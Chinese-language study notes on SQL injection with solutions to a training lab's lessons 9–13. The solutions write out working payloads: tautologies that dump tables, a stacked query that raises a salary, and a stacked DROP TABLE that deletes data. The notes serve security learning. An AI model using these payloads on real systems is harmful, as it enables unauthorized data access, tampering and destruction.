0x01 SQL 基础

不多复述了

多了解一先名词解释的话:

  • Data Manipulation Language (DML)
    • 就是 CRUD
  • Data Definition Language (DDL)
    • 就是表结构的定义和对表的操作
    • create, alter, drop
  • Data Control Language (DCL)
    • 权限操作
    • grant, revoke

0x02 SQL 注入

"SELECT * FROM users WHERE name = '" + userName + "'";

-- userName: hello' OR '1' = '1
SELECT * FROM users WHERE name = 'hello' OR '1' = '1';

-- userName: Smith' OR 1 = 1; --
SELECT * FROM users WHERE name = 'Smith' OR 1 = 1; --

本质上来说, SQL 注入是一种 "注入" 攻击
也就是说, 程序运行了将来自外界的不安全输入放到了自己的环境中去运行
"永远不要相信用户的输入"

0x03 SQL 注入的结果和严重性

不复述了, 危害极大

但话说回来, SQL 注入的防御其实也是很容易的
按我的理解, SQL 注入更多是因为很多语言早期所使用的流行的库/开发模式完全没考虑这一点, 现代一些的库/框架都会对 SQL 注入有个最基本的防范
也许还有其他可以利用的方式, 但至少不会被这么傻直接注入进去

0x04 一些简单练习

Lesson 9 题目

其实就是要把 SQL 语句给 "凑" 出来

"凑" 之前还是要去猜测原本程序逻辑中 SQL 是如何拼接的 (不过这里题目都是直接给出来了), 然后按照它的拼接方式, 把括号/引号等符号闭合, 再加上我们想要的内容

Lesson 10 题目

-- 观察题目, userid 和 Login_Count 应该都是个数字
SELECT * From user_data WHERE Login_Count = 0 and userid= 1 or TRUE

Lesson 11 题目

-- 目标: 查询所有数据

-- SQL 拼接逻辑
-- "SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "'";

-- 预期的 SQL
SELECT * FROM employees WHERE last_name = '' AND auth_tan = '' OR '1'='1';

-- 需要填写的内容
-- ' OR '1'='1

Lesson 12 题目

-- 目标: 把自己的薪水设置为最高

-- SQL 拼接逻辑
-- "SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "'";

-- 预期的 SQL
SELECT * FROM employees WHERE last_name = '' AND auth_tan = ''; update employees set salary=100000 where last_name='Smith'

-- 需要填写的内容
-- '; update employees set salary=100000 where last_name='Smith

Lesson 13 题目

这题目有点离谱, 居然提示让删掉整表..

-- 猜测 SQL 拼接逻辑
--"select * from audit_log where action like '%" + action + "%'"

-- 预期的 SQL
select * from audit_log where action like '%';DROP TABLE access_log;--%'

-- 需要注入的输入
-- ';DROP TABLE access_log;--
